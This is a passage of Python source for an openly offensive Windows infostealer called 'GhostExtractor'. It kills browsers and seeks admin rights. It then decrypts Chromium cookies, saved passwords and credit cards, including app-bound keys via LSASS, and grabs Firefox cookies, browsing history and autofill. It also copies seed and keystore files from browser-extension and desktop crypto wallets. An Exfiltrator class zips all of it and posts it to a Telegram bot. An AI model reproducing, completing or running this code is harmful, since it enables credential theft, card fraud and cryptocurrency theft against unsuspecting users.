        for wallet_name, ext_id in cls.WALLET_EXTENSIONS.items():
            wallet_files = {}

            for storage_type, base_dir in storage_dirs:
                if not os.path.isdir(base_dir):
                    continue

                if storage_type == 'indexeddb':
                    ext_path = os.path.join(
                        base_dir,
                        f'chrome-extension_{ext_id}_0.indexeddb.leveldb'
                    )
                else:
                    ext_path = os.path.join(base_dir, ext_id)

                if not os.path.isdir(ext_path):
                    continue

                try:
                    for fname in os.listdir(ext_path):
                        if fname in cls.WALLET_SKIP_FILES:
                            continue

                        fpath = os.path.join(ext_path, fname)
                        if not os.path.isfile(fpath):
                            continue

                        try:
                            size = os.path.getsize(fpath)
                            if size == 0 or size > 50 * 1024 * 1024:
                                continue

                            with open(fpath, 'rb') as f:
                                content = f.read()

                            wallet_files[f'{storage_type}/{fname}'] = {
                                'size': size,
                                'content_b64': base64.b64encode(content).decode('ascii'),
                            }

                        except (PermissionError, OSError):
                            continue
                        except Exception:
                            continue

                except Exception:
                    continue

            if wallet_files:
                wallets[wallet_name] = wallet_files

        return wallets


class DesktopWalletExtractor:
    """
    Extracts wallet data from standalone desktop cryptocurrency applications.

    Desktop wallets store encrypted seeds, keystores, and configuration
    in their own AppData directories — completely separate from browser
    extension storage. Scans all user profiles to handle UAC context switches.
    """

    WALLETS = {
        'exodus': {
            'paths': [os.path.join(Environment.ROAMING, 'Exodus', 'exodus.wallet')],
            'files': ['seed.seco', 'passphrase.json', 'info.seco'],
            'extra': [
                (os.path.join(Environment.ROAMING, 'Exodus'), 'exodus.conf.json'),
                (os.path.join(Environment.ROAMING, 'Exodus'), 'window-state.json'),
            ],
        },
        'atomic': {
            'paths': [os.path.join(Environment.ROAMING, 'atomic', 'Local Storage', 'leveldb')],
            'files': ['*'],
            'extra': [],
        },
        'electrum': {
            'paths': [os.path.join(Environment.ROAMING, 'Electrum', 'wallets')],
            'files': ['*'],
            'extra': [(os.path.join(Environment.ROAMING, 'Electrum'), 'config')],
        },
        'electrum-ltc': {
            'paths': [os.path.join(Environment.ROAMING, 'Electrum-LTC', 'wallets')],
            'files': ['*'],
            'extra': [],
        },
        'bitcoin-core': {
            'paths': [
                os.path.join(Environment.ROAMING, 'Bitcoin', 'wallets'),
                os.path.join(Environment.ROAMING, 'Bitcoin'),
            ],
            'files': ['wallet.dat', '*.dat'],
            'extra': [],
        },
        'ethereum': {
            'paths': [os.path.join(Environment.ROAMING, 'Ethereum', 'keystore')],
            'files': ['*'],
            'extra': [],
        },
        'monero': {
            'paths': [
                os.path.join(Environment.ROAMING, 'bitmonero'),
                os.path.join(os.path.expanduser('~'), 'Monero', 'wallets'),
            ],
            'files': ['*.keys', '*.address.txt'],
            'extra': [],
        },
        'coinomi': {
            'paths': [os.path.join(Environment.LOCAL, 'Coinomi', 'Coinomi', 'wallets')],
            'files': ['*'],
            'extra': [],
        },
        'guarda': {
            'paths': [os.path.join(Environment.ROAMING, 'Guarda', 'Local Storage', 'leveldb')],
            'files': ['*'],
            'extra': [],
        },
        'wasabi': {
            'paths': [os.path.join(Environment.ROAMING, 'WalletWasabi', 'Client', 'Wallets')],
            'files': ['*.json'],
            'extra': [],
        },
        'binance': {
            'paths': [os.path.join(Environment.ROAMING, 'Binance')],
            'files': ['app-store.json', 'simple-storage.json', '.finger-print.fp'],
            'extra': [],
        },
        'ledger-live': {
            'paths': [os.path.join(Environment.ROAMING, 'Ledger Live')],
            'files': ['app.json'],
            'extra': [],
        },
        'trezor-suite': {
            'paths': [os.path.join(Environment.ROAMING, '@trezor', 'suite-desktop')],
            'files': ['*.json'],
            'extra': [],
        },
        'sparrow': {
            'paths': [os.path.join(os.path.expanduser('~'), '.sparrow', 'wallets')],
            'files': ['*'],
            'extra': [],
        },
    }

    MAX_FILE_SIZE = 10 * 1024 * 1024

    @classmethod
    def extract_all(cls):
        """Scan for all known desktop wallets across ALL user profiles."""
        results = {}
        all_roots = Environment.all_user_roots()

        for wallet_name, config in cls.WALLETS.items():
            try:
                wallet_data = cls._extract_wallet(wallet_name, config, all_roots)
                if wallet_data:
                    results[wallet_name] = wallet_data
            except Exception:
                pass

        return results

    @classmethod
    def _extract_wallet(cls, name, config, all_roots):
        """Extract files from a single desktop wallet, searching all user profiles."""

        wallet_data = {'files': {}}

        search_paths = list(config['paths'])

        for user_root in all_roots:
            roaming = user_root.get('roaming', '')
            local = user_root.get('local', '')

            for original_path in config['paths']:
                if Environment.ROAMING in original_path and roaming:
                    alt = original_path.replace(Environment.ROAMING, roaming)
                    if alt not in search_paths:
                        search_paths.append(alt)

                elif Environment.LOCAL in original_path and local:
                    alt = original_path.replace(Environment.LOCAL, local)
                    if alt not in search_paths:
                        search_paths.append(alt)

        for wallet_dir in search_paths:
            if not os.path.isdir(wallet_dir):
                continue

            try:
                for fname in os.listdir(wallet_dir):
                    fpath = os.path.join(wallet_dir, fname)

                    if not os.path.isfile(fpath):
                        continue

                    if not cls._matches(fname, config['files']):
                        continue

                    try:
                        size = os.path.getsize(fpath)
                        if size > cls.MAX_FILE_SIZE or size == 0:
                            continue

                        with open(fpath, 'rb') as f:
                            content = f.read()

                        wallet_data['files'][fname] = {
                            'size': size,
                            'content_b64': base64.b64encode(content).decode('ascii'),
                        }

                    except (PermissionError, OSError):
                        continue
                    except Exception:
                        continue

            except Exception:
                continue

        extra_paths = list(config.get('extra', []))

        for extra_dir, extra_file in config.get('extra', []):
            for user_root in all_roots:
                roaming = user_root.get('roaming', '')

                if Environment.ROAMING in extra_dir and roaming:
                    alt_dir = extra_dir.replace(Environment.ROAMING, roaming)
                    if (alt_dir, extra_file) not in extra_paths:
                        extra_paths.append((alt_dir, extra_file))

        for extra_dir, extra_file in extra_paths:
            fpath = os.path.join(extra_dir, extra_file)

            if os.path.isfile(fpath):
                try:
                    size = os.path.getsize(fpath)

                    if 0 < size <= cls.MAX_FILE_SIZE:
                        with open(fpath, 'rb') as f:
                            content = f.read()

                        wallet_data['files'][extra_file] = {
                            'size': size,
                            'content_b64': base64.b64encode(content).decode('ascii'),
                        }

                except Exception:
                    pass

        return wallet_data if wallet_data['files'] else None

    @staticmethod
    def _matches(filename, patterns):
        """Check if filename matches any target glob pattern."""

        for pattern in patterns:
            if pattern == '*':
                return True
            
            if pattern.startswith('*') and filename.endswith(pattern[1:]):
                return True
            
            if pattern == filename:
                return True

        return False


class UserAgentExtractor:
    """Extracts browser user agent strings from PE version info."""

    BROWSER_EXES = {
        'chrome':   os.path.join(os.getenv('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        'edge':     os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        'brave':    os.path.join(os.getenv('PROGRAMFILES', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        'yandex':   os.path.join(os.getenv('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'Application', 'browser.exe'),
    }

    BROWSER_EXES_ALT = {
        'chrome': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        'edge':   os.path.join(os.getenv('PROGRAMFILES', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        'brave':  os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
    }

    @classmethod
    def get_file_version(cls, exe_path):
        """Read PE version info from an executable using Win32 API."""

        try:
            size = ctypes.windll.version.GetFileVersionInfoSizeW(exe_path, None)
            if not size:
                return None

            buf = ctypes.create_string_buffer(size)
            if not ctypes.windll.version.GetFileVersionInfoW(exe_path, 0, size, buf):
                return None

            vs_info = ctypes.c_void_p()
            ulen = ctypes.c_uint()

            if not ctypes.windll.version.VerQueryValueW(
                buf, '\\', ctypes.byref(vs_info), ctypes.byref(ulen)
            ):
                return None

            class VS_FIXEDFILEINFO(ctypes.Structure):
                _fields_ = [
                    ('dwSignature', ctypes.c_uint32),
                    ('dwStrucVersion', ctypes.c_uint32),
                    ('dwFileVersionMS', ctypes.c_uint32),
                    ('dwFileVersionLS', ctypes.c_uint32),
                ]

            info = ctypes.cast(vs_info, ctypes.POINTER(VS_FIXEDFILEINFO)).contents

            major = (info.dwFileVersionMS >> 16) & 0xFFFF
            minor = info.dwFileVersionMS & 0xFFFF
            build = (info.dwFileVersionLS >> 16) & 0xFFFF
            patch = info.dwFileVersionLS & 0xFFFF

            return f'{major}.{minor}.{build}.{patch}'

        except Exception:
            return None

    @classmethod
    def build_user_agent(cls, browser_name, version):
        """Construct a standard Chrome-format user agent string."""

        try:
            os_ver = f'{sys.getwindowsversion().major}.{sys.getwindowsversion().minor}'
        except Exception:
            os_ver = '10.0'

        base = (
            f'Mozilla/5.0 (Windows NT {os_ver}; Win64; x64) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{version} Safari/537.36'
        )

        if 'edge' in browser_name:
            return f'{base} Edg/{version}'
        elif 'opera' in browser_name:
            return f'{base} OPR/{version}'
        elif browser_name == 'yandex':
            return base.replace('Safari/537.36', f'YaBrowser/{version} Safari/537.36')

        return base

    @classmethod
    def extract(cls, browser_name):
        """Extract user agent string for a specific browser."""
        for source in (cls.BROWSER_EXES, cls.BROWSER_EXES_ALT):
            exe = source.get(browser_name)
            if exe and os.path.exists(exe):
                version = cls.get_file_version(exe)
                if version:
                    return cls.build_user_agent(browser_name, version)
        return None

    @classmethod
    def extract_all(cls, browser_names):
        """Extract user agent strings for all discovered browsers."""
        agents = {}
        for name in browser_names:
            ua = cls.extract(name)
            if ua:
                agents[name] = ua
        return agents



class BaseBrowserExtractor(ABC):
    """Abstract base for browser data extractors."""

    def __init__(self, cookie_store, lock):
        self._cookies = cookie_store
        self._lock = lock

    def _store(self, browser, batch):
        """Thread-safe batch insert of extracted cookies."""
        if batch:
            with self._lock:
                self._cookies.setdefault(browser, []).extend(batch)

    @abstractmethod
    def extract_all(self):
        """Extract data from all discovered browser instances."""


class ChromiumExtractor(BaseBrowserExtractor):
    """
    Full-spectrum Chromium data extractor.

    Three-phase key extraction prevents token corruption:
      Phase 1: Extract ALL v10 master keys (pure DPAPI, no LSASS)
      Phase 2: Extract v20 keys for ABE browsers (uses LSASS)
      Phase 3: Extract all data using pre-collected keys

    Extracts: cookies, passwords, credit cards, autofill,
    history, downloads, bookmarks, and crypto wallet vaults.
    """

    def __init__(self, cookie_store, lock, password_store=None, extra_data=None):
        super().__init__(cookie_store, lock)
        self._passwords = password_store if password_store is not None else {}
        self._extra = extra_data if extra_data is not None else {}

    def _store_passwords(self, browser, batch):
        """Thread-safe password storage."""
        if batch:
            with self._lock:
                self._passwords.setdefault(browser, []).extend(batch)

    def _store_extra(self, browser, key, data):
        """Thread-safe extra data storage."""
        if data:
            with self._lock:
                self._extra.setdefault(browser, {})[key] = data

    def extract_all(self):
        """Three-phase extraction across all discovered Chromium browsers."""

        browsers = PathDiscovery.chromium()
        if not browsers:
            return

        v10_keys = {}
        v20_keys = {}
        v20_candidates = {}

        for name, path in browsers.items():
            try:
                ls_path = os.path.join(path, 'Local State')
                if not os.path.exists(ls_path):
                    continue

                master_key = MasterKeyExtractor.extract(ls_path, v20=False, browser_name=name)
                if master_key:
                    v10_keys[name] = master_key

                data = MasterKeyExtractor.read_local_state(ls_path)
                if data and MasterKeyExtractor.has_v20(data):
                    v20_candidates[name] = ls_path

            except Exception:
                pass

        for name, ls_path in v20_candidates.items():
            try:
                v20_key = MasterKeyExtractor.extract(ls_path, v20=True, browser_name=name)

                if v20_key:
                    v20_keys[name] = v20_key

            except Exception:
                pass
            finally:
                try:
                    ctypes.windll.advapi32.RevertToSelf()
                except Exception:
                    pass

        for name, path in browsers.items():
            try:
                self._process_browser(
                    name, path,
                    v10_keys.get(name),
                    v20_keys.get(name),
                )
            except Exception:
                pass

    def _process_browser(self, name, path, master_key, v20_key):
        """Extract ALL data from a single Chromium browser installation."""

        for profile in self._discover_profiles(path):
            profile_path = os.path.join(path, profile) if profile else path

            self._extract_cookies(path, profile, name, master_key, v20_key)
            self._extract_passwords(path, profile, name, master_key, v20_key)

            self._store_extra(name, 'credit_cards',
                              DataExtractor.extract_credit_cards(profile_path, master_key, v20_key))

            self._store_extra(name, 'autofill',
                              DataExtractor.extract_autofill(profile_path))

            self._store_extra(name, 'history',
                              DataExtractor.extract_history(profile_path))

            self._store_extra(name, 'downloads',
                              DataExtractor.extract_downloads(profile_path))

            self._store_extra(name, 'bookmarks',
                              DataExtractor.extract_bookmarks(profile_path))

            self._store_extra(name, 'wallets',
                              DataExtractor.extract_wallets(profile_path))

    def _extract_cookies(self, base_path, profile, browser_name, master_key, v20_key):
        """Extract cookies with dynamic schema detection for cross-version compatibility."""

        profile_path = os.path.join(base_path, profile) if profile else base_path
        cookie_db = self._find_cookie_db(profile_path)

        if not cookie_db:
            return

        try:
            with FileOps.temp_copy(cookie_db) as tmp:
                if not tmp:
                    return

                columns = [
                    row[1] for row in
                    DatabaseOps.query(tmp, 'PRAGMA table_info(cookies)')
                ]

                select_cols = ['host_key', 'name', 'encrypted_value']
                optional_cols = ['path', 'expires_utc', 'is_secure', 'is_httponly', 'samesite']
                present_optional = [col for col in optional_cols if col in columns]
                select_cols.extend(present_optional)

                query = f'SELECT {", ".join(select_cols)} FROM cookies'
                rows = DatabaseOps.query(tmp, query)

                batch = []
                for row in rows:
                    host = row[0]
                    name = row[1]
                    encrypted = row[2]

                    extras = {
                        present_optional[i]: row[3 + i]
                        for i in range(len(present_optional))
                        if 3 + i < len(row)
                    }

                    if not encrypted:
                        continue

                    value = CookieDecryptor.decrypt(encrypted, master_key, v20_key)
                    if not value:
                        continue

                    expires_raw = extras.get('expires_utc', 0)
                    unix_expires = 0

                    if expires_raw:
                        unix_expires = max(0, (expires_raw // 1000000) - 11644473600)

                    samesite_int = extras.get('samesite', -1)
                    samesite_str = {
                        0: 'no_restriction', 1: 'lax', 2: 'strict'
                    }.get(samesite_int, 'unspecified')

                    batch.append({
                        'host':     host,
                        'name':     name,
                        'value':    value,
                        'path':     extras.get('path', '/') or '/',
                        'secure':   bool(extras.get('is_secure', 1)),
                        'httponly':  bool(extras.get('is_httponly', 0)),
                        'expires':  unix_expires if unix_expires > 0 else int(time.time()) + 31536000,
                        'samesite': samesite_str,
                    })

                self._store(browser_name, batch)

        except Exception:
            pass

    def _extract_passwords(self, base_path, profile, browser_name, master_key, v20_key):
        """Extract saved passwords from Login Data database."""

        profile_path = os.path.join(base_path, profile) if profile else base_path

        login_db = None
        for candidate in [
            os.path.join(profile_path, 'Login Data'),
            os.path.join(profile_path, 'Network', 'Login Data'),
        ]:
            if os.path.exists(candidate):
                login_db = candidate
                break

        if not login_db:
            return

        try:
            with FileOps.temp_copy(login_db) as tmp:
                if not tmp:
                    return

                rows = DatabaseOps.query(tmp, '''
                    SELECT origin_url, username_value, password_value
                    FROM logins
                    WHERE LENGTH(password_value) > 0
                ''')

                batch = []
                for url, username, enc_password in rows:
                    if not enc_password or not username:
                        continue

                    password = CookieDecryptor.decrypt(enc_password, master_key, v20_key)
                    if password:
                        batch.append({
                            'url': url,
                            'username': username,
                            'password': password,
                        })

                self._store_passwords(browser_name, batch)

        except Exception:
            pass

    @staticmethod
    def _discover_profiles(base):
        """
        List all profile directories, including non-standard ones.

        Handles: Default, Profile N, Guest Profile, System Profile,
        and any directory containing a Cookies database (catches
        Yandex/Opera/Electron non-standard naming).
        """
        profiles = []

        try:
            for entry in os.scandir(base):
                if not entry.is_dir():
                    continue

                dirname = entry.name

                if dirname in ('Default', 'Guest Profile', 'System Profile'):
                    profiles.append(dirname)
                elif dirname.startswith('Profile '):
                    profiles.append(dirname)
                elif (os.path.exists(os.path.join(entry.path, 'Cookies')) or
                      os.path.exists(os.path.join(entry.path, 'Network', 'Cookies'))):
                    profiles.append(dirname)

        except Exception:
            pass

        if not profiles:
            if ChromiumExtractor._find_cookie_db(base):
                profiles.append('')

        return profiles if profiles else ['Default']

    @staticmethod
    def _find_cookie_db(profile_path):
        """Locate the Cookies database within a profile directory."""
        candidates = [
            os.path.join(profile_path, 'Network', 'Cookies'),
            os.path.join(profile_path, 'Cookies'),
        ]
        return next((f for f in candidates if os.path.exists(f)), None)


class GeckoExtractor(BaseBrowserExtractor):
    """Extracts cookies from all Gecko-based browsers (Firefox family)."""

    def extract_all(self):
        """Discover and extract cookies from every Gecko browser profile."""
        for browser_name, profile_name, cookie_path in PathDiscovery.gecko():
            try:
                with FileOps.temp_copy(cookie_path) as tmp:
                    if not tmp:
                        continue

                    rows = DatabaseOps.query(
                        tmp, 'SELECT name, value, host FROM moz_cookies'
                    )

                    batch = [
                        {'host': host, 'name': name, 'value': value}
                        for name, value, host in rows
                        if value
                    ]

                    self._store(browser_name, batch)

            except Exception:
                pass


class Exfiltrator:
    """Builds in-memory ZIP archive and sends via Telegram Bot API."""

    def __init__(self, token, chat_id):
        self._token   = token
        self._chat_id = chat_id

    def send(self, 
        cookies, 
        username, 
        passwords=None, 
        user_agents=None,
        extra_data=None,
        desktop_wallets=None
    ):
        """Compress all extracted data and POST to Telegram as a document."""

        if not (cookies or passwords or extra_data or desktop_wallets):
            return

        archive = self._build_archive(
            cookies, passwords, user_agents, extra_data, desktop_wallets
        )

        total_cookies   = sum(len(v) for v in cookies.values())
        total_passwords = sum(len(v) for v in (passwords or {}).values())
        total_cards     = sum(len(d.get('credit_cards', [])) for d in (extra_data or {}).values())
        total_wallets   = (
            sum(len(d.get('wallets', {})) for d in (extra_data or {}).values())
            + len(desktop_wallets or {})
        )

        timestamp = datetime.now().strftime('%Y/%m/%d %H:%M:%S')

        caption = (
            f'\U0001F464 {username}\n'
            f'\U0001F4C5 {timestamp}\n'
            f'\U0001F36A {total_cookies} cookies\n'
            f'\U0001F511 {total_passwords} passwords\n'
            f'\U0001F4B3 {total_cards} cards\n'
            f'\U0001FA99 {total_wallets} wallets\n'
            f'\U0001F310 {len(cookies)} browsers'
        )

        for attempt in range(5):
            try:
                archive.seek(0)

                resp = requests.post(
                    f'https://api.telegram.org/bot{self._token}/sendDocument',
                    files={'document': (
                        f'{username.lower()}_data.zip', archive, 'application/zip'
                    )},
                    data={'caption': caption, 'chat_id': self._chat_id},
                    timeout=60,
                )

                if resp.status_code == 200:
                    return

            except requests.exceptions.RequestException:
                time.sleep(min(2 ** attempt, 30))
            except Exception:
                break

    @staticmethod
    def _build_archive(cookies, passwords=None, user_agents=None,
                       extra_data=None, desktop_wallets=None):
        """Build a ZIP archive entirely in memory with all extracted data."""
        buf = io.BytesIO()

        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:

            for browser, entries in cookies.items():
                hosts = {}
                for entry in entries:
                    safe_host = (
                        ''.join(c for c in entry['host'] if c.isalnum() or c in '._-').strip()
                        or 'unknown'
                    )
                    hosts.setdefault(safe_host, []).append(
                        f"{entry['name']}={entry['value']};"
                    )

                for host, vals in hosts.items():
                    zf.writestr(f'{browser}/{host}.txt', ' '.join(vals))

                cookie_editor = []
                for entry in entries:
                    host = entry['host']
                    cookie_editor.append({
                        'domain':         host if host.startswith('.') else f".{host}",
                        'expirationDate': entry.get('expires', int(time.time()) + 31536000),
                        'hostOnly':       not host.startswith('.'),
                        'httpOnly':       entry.get('httponly', False),
                        'name':           entry['name'],
                        'path':           entry.get('path', '/'),
                        'sameSite':       entry.get('samesite', 'unspecified'),
                        'secure':         entry.get('secure', True),
                        'session':        False,
                        'storeId':        '0',
                        'value':          entry['value'],
                    })

                zf.writestr(f'{browser}/cookies.json', json.dumps(cookie_editor, indent=2))

            if passwords:
                for browser, entries in passwords.items():
                    if not entries:
                        continue

                    lines = []
                    for entry in entries:
                        lines.append(
                            f"URL: {entry['url']}\n"
                            f"User: {entry['username']}\n"
                            f"Pass: {entry['password']}\n"
                            f"{'─' * 40}"
                        )

                    zf.writestr(f'{browser}/passwords.txt', '\n'.join(lines))
                    zf.writestr(f'{browser}/passwords.json', json.dumps(entries, indent=2))

            if extra_data:
                for browser, data in extra_data.items():

                    if data.get('credit_cards'):
                        cards = data['credit_cards']
                        lines = []
                        for card in cards:
                            lines.append(
                                f"Card: {card.get('number', 'N/A')}\n"
                                f"Name: {card.get('name', 'N/A')}\n"
                                f"Exp:  {card.get('month', '?')}/{card.get('year', '?')}\n"
                                f"{'─' * 40}"
                            )
                        zf.writestr(f'{browser}/credit_cards.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/credit_cards.json', json.dumps(cards, indent=2))

                    if data.get('autofill'):
                        autofill = data['autofill'][:500]
                        lines = [
                            f"{e['field']}: {e['value']} ({e['count']}x)"
                            for e in autofill
                        ]
                        zf.writestr(f'{browser}/autofill.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/autofill.json', json.dumps(autofill, indent=2))

                    if data.get('history'):
                        history = data['history'][:2000]
                        lines = [
                            f"{e.get('title', 'No title')}\n"
                            f"  {e['url']}\n"
                            f"  Visits: {e['visits']}"
                            for e in history
                        ]
                        zf.writestr(f'{browser}/history.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/history.json', json.dumps(history, indent=2))

                    if data.get('downloads'):
                        downloads = data['downloads'][:500]
                        lines = [
                            f"{e['path']}\n  From: {e['url']}\n  Size: {e['size']}"
                            for e in downloads
                        ]
                        zf.writestr(f'{browser}/downloads.txt', '\n'.join(lines))

                    if data.get('bookmarks'):
                        bookmarks = data['bookmarks']
                        lines = [
                            f"[{e.get('folder', '')}] {e['name']}\n  {e['url']}"
                            for e in bookmarks
                        ]
                        zf.writestr(f'{browser}/bookmarks.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/bookmarks.json', json.dumps(bookmarks, indent=2))

                    if data.get('wallets'):
                        for wallet_name, wallet_files in data['wallets'].items():
                            if not isinstance(wallet_files, dict) or not wallet_files:
                                continue

                            has_data = False
                            for file_key, file_info in wallet_files.items():
                                if isinstance(file_info, dict) and 'content_b64' in file_info:
                                    try:
                                        raw = base64.b64decode(file_info['content_b64'])
                                        safe_key = file_key.replace('/', '_')
                                        zf.writestr(
                                            f'{browser}/wallets/{wallet_name}/{safe_key}',
                                            raw
                                        )
                                        has_data = True
                                    except Exception:
                                        pass

                            if has_data:
                                summary = {
                                    k: v.get('size', 0)
                                    for k, v in wallet_files.items()
                                    if isinstance(v, dict) and 'size' in v
                                }
                                if summary:
                                    zf.writestr(
                                        f'{browser}/wallets/{wallet_name}/index.json',
                                        json.dumps(summary, indent=2),
                                    )

            if desktop_wallets:
                for wallet_name, wallet_data in desktop_wallets.items():
                    if not wallet_data or not wallet_data.get('files'):
                        continue

                    for fname, finfo in wallet_data['files'].items():
                        try:
                            raw = base64.b64decode(finfo['content_b64'])
                            zf.writestr(f'desktop_wallets/{wallet_name}/{fname}', raw)
                        except Exception:
                            pass

                summary = {
                    name: {
                        'files': list(data.get('files', {}).keys()),
                        'total_size': sum(
                            f.get('size', 0) for f in data.get('files', {}).values()
                        ),
                    }
                    for name, data in desktop_wallets.items()
                    if data and data.get('files')
                }

                if summary:
                    zf.writestr('desktop_wallets/index.json', json.dumps(summary, indent=2))

            if user_agents:
                zf.writestr('user_agents.json', json.dumps(user_agents, indent=2))

        buf.seek(0)
        return buf


class GhostExtractor:
    """
    Top-level orchestrator.

    Kills browser processes, discovers all Chromium and Gecko browsers,
    extracts cookies/passwords/cards/history/wallets, captures user agents,
    scans desktop wallet applications, and exfiltrates everything via Telegram.
    """

    def __init__(self, tg_token, tg_chat_id):
        self._cookies     = {}
        self._passwords   = {}
        self._extra       = {}
        self._lock        = threading.Lock()
        self._exfiltrator = Exfiltrator(tg_token, tg_chat_id)
        self._username    = Environment.USER

    def run(self):
        """Execute the full extraction and exfiltration pipeline."""
        ProcessKiller.kill_all()

        ChromiumExtractor(
            self._cookies, self._lock, self._passwords, self._extra
        ).extract_all()

        GeckoExtractor(self._cookies, self._lock).extract_all()

        user_agents = UserAgentExtractor.extract_all(self._cookies.keys())
        desktop_wallets = DesktopWalletExtractor.extract_all()

        if self._cookies or self._passwords or self._extra or desktop_wallets:
            thread = threading.Thread(
                target=self._exfiltrator.send,
                args=(
                    self._cookies, self._username, self._passwords,
                    user_agents, self._extra, desktop_wallets,
                ),
                daemon=True,
            )

            thread.start()
            thread.join(timeout=60)


if __name__ == '__main__':
    if not Environment.is_admin():
        Environment.elevate()

    GhostExtractor(TG_TOKEN, TG_CHAT_ID).run()
